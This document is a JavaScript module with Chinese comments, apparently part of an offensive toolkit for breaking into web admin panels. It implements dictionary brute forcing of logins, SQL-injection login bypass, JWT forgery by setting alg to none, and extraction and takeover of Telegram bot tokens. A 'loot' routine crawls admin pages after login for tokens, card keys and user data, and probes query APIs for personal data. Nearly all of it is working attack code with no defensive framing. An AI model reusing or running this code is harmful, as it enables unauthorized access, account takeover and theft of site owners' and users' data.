'use strict';

// 后台突破：登录爆破、万能口令注入、JWT 伪造、Bot Token 提取与接管、接口直调。
// 全部走全局 fetch（已按 config.proxy 装好代理）。

const dict = require('./dict');
const config = require('./config');

const UA = (config && config.userAgent) || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36';

function withTimeout(promise, ms) {
  return new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error('timeout')), ms);
    promise.then(resolve, reject).finally(() => clearTimeout(t));
  });
}

function normalizeUrl(u) {
  let s = String(u || '').trim();
  if (!s) throw new Error('缺少 URL');
  if (!/^https?:\/\//i.test(s)) s = 'http://' + s;
  return s.replace(/\/+$/, '');
}

// ---------- 登录页解析 ----------
function parseHiddenInputs(html) {
  const out = {};
  const re = /<input\b[^>]*>/gi;
  let m;
  while ((m = re.exec(html || ''))) {
    const tag = m[0];
    if (!/type\s*=\s*["']?hidden["']?/i.test(tag)) continue;
    const n = tag.match(/name\s*=\s*["']([^"']+)["']/i);
    const v = tag.match(/value\s*=\s*["']([^"']*)["']/i);
    if (n) out[n[1]] = v ? v[1] : '';
  }
  return out;
}

function parseFormFields(html) {
  const names = [];
  const re = /<input\b[^>]*>/gi;
  let m;
  while ((m = re.exec(html || ''))) {
    const tag = m[0];
    if (/type\s*=\s*["']?(hidden|submit|button)["']?/i.test(tag)) continue;
    const n = tag.match(/name\s*=\s*["']([^"']+)["']/i);
    if (n) names.push(n[1]);
  }
  return [...new Set(names)];
}

// Set-Cookie 可能是多组、带 Path/Expires/HttpOnly 等属性，只保留 name=value
function cookieFromSetCookie(setCookie) {
  if (!setCookie) return '';
  const parts = String(setCookie).split(/,(?=\s*[^;=]+=[^;]*;?\s*(?:expires|path|domain|secure|httponly|samesite|=|$))/i);
  const flat = parts.length ? parts : [setCookie];
  const pairs = [];
  for (const p of flat) {
    // 每组里可能有多个 cookie（用逗号分隔的情况已处理），这里再按分号切属性
    const kv = String(p).split(';')[0].trim();
    if (kv && kv.includes('=')) pairs.push(kv);
  }
  return pairs.join('; ');
}

async function getLoginPage(url, timeoutMs) {
  const r = await withTimeout(fetch(normalizeUrl(url), {
    redirect: 'follow',
    headers: { 'User-Agent': UA, Accept: 'text/html,*/*' },
  }), timeoutMs || 15000);
  const html = await r.text();
  const setCookie = r.headers.get('set-cookie') || '';
  return {
    url: r.url,
    status: r.status,
    html,
    setCookie,
    cookie: setCookie.split(';')[0],
    hidden: parseHiddenInputs(html),
    fields: parseFormFields(html),
    hasCaptcha: /验证码|captcha|verify|code\.php|seccode/i.test(html),
    title: (html.match(/<title[^>]*>([^<]{0,120})<\/title>/i) || [])[1] || '',
  };
}

// ---------- 单次登录尝试 ----------
async function attemptLogin(opts) {
  const o = opts || {};
  const headers = { 'User-Agent': UA, Accept: '*/*', Origin: o.base || '' };
  if (o.cookie) headers['Cookie'] = o.cookie;
  const data = Object.assign({}, o.extra || {}, o.hidden || {});
  data[o.userField] = o.username;
  data[o.passField] = o.password;

  let body;
  if (o.contentType === 'json') {
    headers['Content-Type'] = 'application/json';
    body = JSON.stringify(data);
  } else {
    headers['Content-Type'] = 'application/x-www-form-urlencoded';
    body = new URLSearchParams(data).toString();
  }

  const r = await withTimeout(fetch(o.url, {
    method: (o.method || 'POST').toUpperCase(),
    headers,
    body,
    redirect: 'manual',
  }), o.timeout || 12000);

  let text = '';
  try { text = await r.text(); } catch (e) { /* ignore */ }
  return {
    status: r.status,
    length: text.length,
    setCookie: r.headers.get('set-cookie') || '',
    cookie: cookieFromSetCookie(r.headers.get('set-cookie') || ''),
    location: r.headers.get('location') || '',
    text: text.slice(0, 6000),
  };
}

function looksSuccess(res, baseline) {
  const t = (res.text || '').toLowerCase();
  const hit = dict.SUCCESS_KEYWORDS.filter((k) => t.includes(k.toLowerCase()));
  const failHit = dict.FAIL_KEYWORDS.filter((k) => t.includes(k.toLowerCase()));
  let diff = false;
  if (baseline) {
    const lenGap = Math.abs(res.length - baseline.length);
    const ratio = baseline.length ? lenGap / baseline.length : 1;
    if (res.status !== baseline.status) diff = true;
    else if (ratio > 0.15) diff = true;
    else if (res.setCookie && !baseline.setCookie) diff = true;
    else if (res.location && res.location !== baseline.location) diff = true;
  }
  // 有"失败"关键词就基本排除（验证码除外——验证码只说明要过人机，不代表口令错）
  const hardFail = failHit.filter((k) => k !== '验证码' && k !== 'captcha' && k !== 'verify code');
  if (hardFail.length && !hit.length) return { ok: false, why: '命中失败特征: ' + hardFail.slice(0, 3).join('/') };
  if (hit.length) return { ok: true, why: '命中成功特征: ' + hit.slice(0, 3).join('/') };
  if (diff) return { ok: true, why: '与失败基线明显不同（状态/长度/Cookie/跳转不同）' };
  return { ok: false, why: '' };
}

// ---------- 口令爆破 ----------
async function bruteLogin(opts) {
  const o = opts || {};
  const url = normalizeUrl(o.url);
  const base = url.replace(/\/[^/]*$/, '');
  const timeout = o.timeout || 12000;

  const page = o.skipGet ? { cookie: '', hidden: {}, fields: [], hasCaptcha: false } : await getLoginPage(url, 15000);
  const hidden = Object.assign({}, page.hidden || {}, o.hidden || {});

  const fieldSets = (o.fieldSets && o.fieldSets.length)
    ? o.fieldSets
    : (page.fields && page.fields.length >= 2
      ? guessFieldSet(page.fields)
      : dict.LOGIN_FIELD_SETS);

  const users = (o.usernames && o.usernames.length) ? o.usernames : dict.COMMON_USERS.slice(0, 4);
  const passwords = (o.passwords && o.passwords.length) ? o.passwords : dict.WEAK_PASSWORDS;

  const candidates = [];
  const tried = [];
  const set = fieldSets[0];

  // 基线：随机密码，用来对比
  let baseline = null;
  try {
    baseline = await attemptLogin({
      url, base, cookie: o.cookie || page.cookie, hidden,
      userField: set.user, passField: set.pass,
      username: users[0], password: 'zz' + Math.random().toString(36).slice(2, 12) + 'ZZ',
      contentType: o.contentType, extra: o.extra, method: o.method, timeout,
    });
  } catch (e) {
    return { url, error: '基线请求失败: ' + e.message, candidates, tried };
  }

  for (const u of users) {
    for (const p of passwords) {
      let res;
      try {
        res = await attemptLogin({
          url, base, cookie: o.cookie || page.cookie, hidden,
          userField: set.user, passField: set.pass,
          username: u, password: p,
          contentType: o.contentType, extra: o.extra, method: o.method, timeout,
        });
      } catch (e) {
        tried.push({ username: u, password: p, error: e.message });
        continue;
      }
      const verdict = looksSuccess(res, baseline);
      if (verdict.ok) {
        candidates.push({
          username: u, password: p,
          cookie: res.cookie || '',
          location: res.location,
          evidence: verdict.why,
          status: res.status,
          length: res.length,
        });
        if (o.stopOnFirst) return { url, loginPage: { hasCaptcha: page.hasCaptcha, title: page.title, fields: page.fields, hidden: page.hidden }, baseline: { status: baseline.status, length: baseline.length }, candidates, tried };
      } else {
        tried.push({ username: u, password: p, status: res.status, length: res.length });
      }
    }
  }

  return {
    url,
    loginPage: { hasCaptcha: page.hasCaptcha, title: page.title, fields: page.fields, hidden: page.hidden },
    baseline: { status: baseline.status, length: baseline.length },
    candidates,
    triedCount: tried.length,
  };
}

function guessFieldSet(fields) {
  const lower = fields.map((f) => f.toLowerCase());
  const pass = lower.find((f) => /pass|pwd|密码/.test(f)) || 'password';
  const user = lower.find((f) => /user|name|account|email|账号|用户名/.test(f)) || 'username';
  return [{ user: fields[lower.indexOf(user)] || user, pass: fields[lower.indexOf(pass)] || pass }];
}

// ---------- 万能口令 / SQL 注入登录 ----------
async function sqliLogin(opts) {
  const o = opts || {};
  const url = normalizeUrl(o.url);
  const base = url.replace(/\/[^/]*$/, '');
  const page = o.skipGet ? { cookie: '', hidden: {}, fields: [] } : await getLoginPage(url, 15000);
  const hidden = Object.assign({}, page.hidden || {}, o.hidden || {});
  const set = (page.fields && page.fields.length >= 2) ? guessFieldSet(page.fields)[0] : dict.LOGIN_FIELD_SETS[0];
  const payloads = (o.payloads && o.payloads.length) ? o.payloads : dict.SQLI_PAYLOADS;
  const users = (o.usernames && o.usernames.length) ? o.usernames : ['admin'];

  let baseline = null;
  try {
    baseline = await attemptLogin({
      url, base, cookie: o.cookie || page.cookie, hidden,
      userField: set.user, passField: set.pass,
      username: 'nosuchuser_' + Math.random().toString(36).slice(2, 8),
      password: 'nopass_' + Math.random().toString(36).slice(2, 8),
      contentType: o.contentType, extra: o.extra, method: o.method, timeout: o.timeout || 12000,
    });
  } catch (e) {
    return { url, error: '基线请求失败: ' + e.message, candidates: [] };
  }

  const candidates = [];
  const tried = [];
  // 用户名注入 + 密码注入，两种都试
  const combos = [];
  for (const u of users) for (const p of payloads) combos.push({ u, p, mode: 'pass' });
  for (const u of payloads) combos.push({ u, p: 'x', mode: 'user' });

  for (const c of combos) {
    let res;
    try {
      res = await attemptLogin({
        url, base, cookie: o.cookie || page.cookie, hidden,
        userField: set.user, passField: set.pass,
        username: c.u, password: c.p,
        contentType: o.contentType, extra: o.extra, method: o.method, timeout: o.timeout || 12000,
      });
    } catch (e) { tried.push({ ...c, error: e.message }); continue; }
    const verdict = looksSuccess(res, baseline);
    if (verdict.ok) {
      candidates.push({ mode: c.mode, username: c.u, password: c.p, cookie: res.cookie || '', evidence: verdict.why, status: res.status, length: res.length });
    } else {
      tried.push({ mode: c.mode, username: c.u, password: c.p, status: res.status, length: res.length });
    }
  }
  return { url, baseline: { status: baseline.status, length: baseline.length }, candidates, triedCount: tried.length };
}

// ---------- JWT ----------
function jwtDecode(token) {
  const parts = String(token || '').split('.');
  if (parts.length !== 3) return null;
  const b64 = (s) => Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
  try {
    return { header: JSON.parse(b64(parts[0])), payload: JSON.parse(b64(parts[1])), signature: parts[2] };
  } catch (e) { return null; }
}

// alg=none 伪造（老后台最常见的 JWT 缺陷）
function jwtForge(token, patch) {
  const d = jwtDecode(token);
  if (!d) return null;
  const b64u = (o) => Buffer.from(JSON.stringify(o)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const header = Object.assign({}, d.header, { alg: 'none' });
  const payload = Object.assign({}, d.payload, patch || {});
  return b64u(header) + '.' + b64u(payload) + '.';
}

// ---------- Bot Token ----------
function extractBotTokens(text) {
  const src = String(text || '');
  const out = new Set();
  let m;
  const re = new RegExp(dict.BOT_TOKEN_RE.source, 'g');
  while ((m = re.exec(src))) out.add(m[0]);
  return [...out];
}

async function botApi(token, method, params) {
  const url = 'https://api.telegram.org/bot' + String(token) + '/' + method;
  const isGet = !params || ['getMe', 'getUpdates', 'getWebhookInfo', 'getChat', 'getChatAdministrators'].includes(method);
  const opt = { method: isGet ? 'GET' : 'POST', headers: { 'User-Agent': UA } };
  let finalUrl = url;
  if (isGet && params) {
    finalUrl += '?' + new URLSearchParams(Object.entries(params).map(([k, v]) => [k, typeof v === 'object' ? JSON.stringify(v) : String(v)])).toString();
  } else if (params) {
    opt.headers['Content-Type'] = 'application/json';
    opt.body = JSON.stringify(params);
  }
  const r = await withTimeout(fetch(finalUrl, opt), 20000);
  let j = null;
  try { j = await r.json(); } catch (e) { /* ignore */ }
  return { status: r.status, ok: j && j.ok, result: j ? j.result : null, description: j ? j.description : null, raw: j };
}

// ---------- 通用接口直调 ----------
async function directCall(opts) {
  const o = opts || {};
  const url = o.url;
  if (!url) throw new Error('缺少 url');
  const headers = Object.assign({ 'User-Agent': UA }, o.headers || {});
  let body = o.body;
  if (body && typeof body === 'object') {
    if (String(headers['Content-Type'] || '').includes('json')) body = JSON.stringify(body);
    else body = new URLSearchParams(body).toString();
  }
  const started = Date.now();
  const r = await withTimeout(fetch(url, {
    method: (o.method || 'GET').toUpperCase(),
    headers,
    body: (o.method || 'GET').toUpperCase() === 'GET' ? undefined : body,
    redirect: 'follow',
  }), o.timeout || 20000);
  let text = '';
  try { text = await r.text(); } catch (e) { /* ignore */ }
  return { status: r.status, url: r.url, ms: Date.now() - started, length: text.length, body: text.slice(0, 8000) };
}

// ---------- 登录后"扫荡"：找 bot token、找查询接口、找卡密/用户数据 ----------
async function loot(opts) {
  const o = opts || {};
  const base = normalizeUrl(o.baseUrl || o.url);
  const cookie = o.cookie || '';
  const paths = (o.paths && o.paths.length) ? o.paths : dict.QUERY_API_PATHS;
  const pages = o.pages || ['/', '/admin', '/admin/index', '/admin/index.php', '/index.php?m=admin', '/admin/main', '/admin/user', '/admin/kami', '/admin/order', '/admin/config'];

  const tokens = new Set();
  const found = [];
  const links = new Set();

  for (const p of pages) {
    try {
      const r = await withTimeout(fetch(base + p, {
        headers: { 'User-Agent': UA, Cookie: cookie, Accept: 'text/html,*/*' },
        redirect: 'follow',
      }), 12000);
      const t = await r.text();
      if (r.status === 200) found.push({ path: p, status: r.status, size: t.length });
      extractBotTokens(t).forEach((x) => tokens.add(x));
      const re = /href=["'](\/[^"']{1,120})["']/gi;
      let m;
      while ((m = re.exec(t))) {
        if (/user|kami|card|order|record|log|member|query|search|config|setting|token|bot/i.test(m[1])) links.add(m[1]);
      }
    } catch (e) { /* ignore */ }
  }

  // 盲打查询接口，看哪个能返回数据
  const apis = [];
  for (const p of paths) {
    const u = base + p;
    try {
      const r = await directCall({
        url: u, method: 'POST', timeout: 10000,
        headers: Object.assign({ Cookie: cookie, 'Content-Type': 'application/x-www-form-urlencoded' }, o.headers || {}),
        body: Object.assign({}, o.sampleParams || { keyword: '13800138000' }),
      });
      if (r.status === 200 && r.length > 0 && r.length < 200000) {
        apis.push({ path: p, status: r.status, size: r.length, preview: r.body.slice(0, 300) });
      }
    } catch (e) { /* ignore */ }
  }

  return { base, botTokens: [...tokens], adminPages: found, interestingLinks: [...links].slice(0, 60), queryApis: apis };
}

module.exports = {
  getLoginPage, parseHiddenInputs, parseFormFields, attemptLogin, looksSuccess,
  cookieFromSetCookie,
  bruteLogin, sqliLogin, guessFieldSet,
  jwtDecode, jwtForge,
  extractBotTokens, botApi,
  directCall, loot, normalizeUrl,
};
